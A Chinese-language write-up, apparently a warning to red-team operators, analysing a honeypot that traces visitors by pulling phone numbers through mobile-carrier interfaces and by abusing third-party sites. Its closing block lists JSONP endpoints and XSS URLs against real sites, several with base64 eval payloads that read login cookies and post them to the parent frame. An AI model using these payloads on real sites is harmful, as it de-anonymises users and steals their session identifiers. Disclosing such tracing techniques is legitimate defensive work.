**这个蜜罐的溯源方式针对使用手机热点的红队人员。蜜罐直接获取攻击者手机号进行溯源。一抓一个准。各位红队人员小心为妙。**


首先打开网站，他会监控是否开启了F12控制台，如果开启了调试模式的话，溯源代码会停止加载。


另外，针对使用burp的用户。小心你们的burp版本是否存在chrome的漏洞。

沙箱的特征如下，直接加载js

![image](https://user-images.githubusercontent.com/110118141/181291990-39d2e173-0fb7-4f19-86dd-d6a79fec65cb.png)



fofa上面可以直接搜索到142多条，看来蜜罐还挺多啊

![image](https://user-images.githubusercontent.com/110118141/181292077-8b3944b8-4e21-459b-8750-0a6dbdf60906.png)




重点获取手机号js代码，可以看到会获取三大运营商的手机信息

![image](https://user-images.githubusercontent.com/110118141/181292646-f2a3b539-0c67-4abd-b2a8-1e21a55416b3.png)


![image](https://user-images.githubusercontent.com/110118141/181292729-e21bc4c7-9c5d-40d5-a2d3-2c8037488fc2.png)


解密如下

获取联通的接口


![image](https://user-images.githubusercontent.com/110118141/181292795-ff402c1a-c909-4185-b7d0-7f5ff9f72a77.png)




如果获取到手机号码的话，会将加密的手机号上传


![image](https://user-images.githubusercontent.com/110118141/181292859-450a00b6-a4b9-490a-91c1-6cfad664b5eb.png)



另外其他溯源接口如下
```
https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&getannual=1&geticon=1&getsvip=1&otype=json&callback=jQuery19104991404611435173_1562551736901&uin=a&t=1&getadpass=0&g_tk=a&g_vstk=a&g_actk=&_=15625517369020.4515320024420155

https://bbs.zhibo8.cc/user/userinfo?device=pc&_=1584613345023&callback=jcbDNoDtQbW&callback=callback_165893378313192912

https://myjr.suning.com/sfp/mutualTrust/getLoginInfo.htm?callback=getphone

https://myjr.suning.com/sfp/headPic/getEgoMemberHeadPicUrl.htm

https://ajax.58pic.com/58pic/index.php?m=adManageSystem&a=showAdDeliveryForPosition&callback=%3Cscript%3Eeval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoicWlhbnR1IiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgicXRfdWlkIil9fSwnKicpOw==%27))%3C/script%3E&position=31&keyword=XXX&_=1590829943379

https://my.zol.com.cn/public_new.php

https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&getannual=1&geticon=1&getsvip=1&otype=json&callback=jQuery19104991404611435173_1562551736901&uin=a&t=1&getadpass=0&g_tk=a&g_vstk=a&g_actk=&_=15625517369020.04630644674906281

https://access.video.qq.com/trans/pay.video.qq.com/fcgi-bin/payvip?vappid=68106135&vsecret=e667570eb833960cc41051d498df1c233308eb195dba2cc3&getannual=1&geticon=1&getsvip=1&otype=json&callback=jQuery19104991404611435173_1562551736901&uin=a&t=1&getadpass=0&g_tk=a&g_vstk=a&g_actk=&_=15625517369020.38244545320223655

http://my.zol.com.cn/public_new.php

https://loginst.suning.com/authStatus?callback=getuid

https://www.fhyx.com/account/login.html?redirecturl=%22%3E%3CSCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/SCrIpT%3E

https://so.u17.com/all/%22%3C/span%3E%250a%3Cimg%2520src=1%20onerror=%22document.body.innerHTML=location.search;document.body.innerHTML=document.body.innerText;%22%3E%250a%22/m0_p1.html?&lt;img/src=&quot;x&quot;/onerror=a=eval;a(atob(unescape(location.hash.slice(1))))&gt;

https://i.vip.iqiyi.com/client/store/pc/checkout.action?platform=b6c13e26323c537d&fs=&fsSign=&fc=&fv=&qc005=&P00001=&pid=adb3376b039b970b&vipType=2&aid=&device_id=&callback=callback_165893378307001282

https://login.sina.com.cn/sso/login.php?client=&service=&client=&encoding=&gateway=1&returntype=TEXT&useticket=0&callback=sina2&_=1577938268947&callback=callback_165893378307919803

https://v-api-plus.huya.com/jsapi/getUserInfo?callback=jQuery1111007865243652615272_1628490347897&_=1628490347898&callback=callback_165893378306693233

http://mapp.jrj.com.cn/pc/content/getMqNews?vname=%3Csvg%20onload=eval(atob(%27ZnVuY3Rpb24gZ2V0Q29va2llKG5hbWUpIAp7IAogICAgdmFyIGFycixyZWc9bmV3IFJlZ0V4cCgiKF58ICkiK25hbWUrIj0oW147XSopKDt8JCkiKTsKIAogICAgaWYoYXJyPWRvY3VtZW50LmNvb2tpZS5tYXRjaChyZWcpKQogCiAgICAgICAgcmV0dXJuIGRlY29kZVVSSUNvbXBvbmVudChhcnJbMl0pOyAKICAgIGVsc2UgCiAgICAgICAgcmV0dXJuIG51bGw7IAp9CndpbmRvdy5wYXJlbnQucG9zdE1lc3NhZ2UoeyJuYW1lIjoianJqIiwiZGF0YSI6eyJ1aWQiOmdldENvb2tpZSgibXlqcmpfdXNlcmlkIil9fSwnKicpOw==%27))%3E

https://www.ixueshu.com/index.html?v=1608893853571&template=sys_login_ajax.html&_url=123123123%22%22%3E%3CsCrIpT%3Eeval(atob(unescape(location.hash.slice(1))))%3C/sCrIpT%3E

https://hackit.me/v.qq.com/

https://api.csdn.net/oauth/authorize?client_id=1000001&redirect_uri=http://www.iteye.com/auth/csdn/callback&response_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient_id%3D1000001%26redirect_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E
```

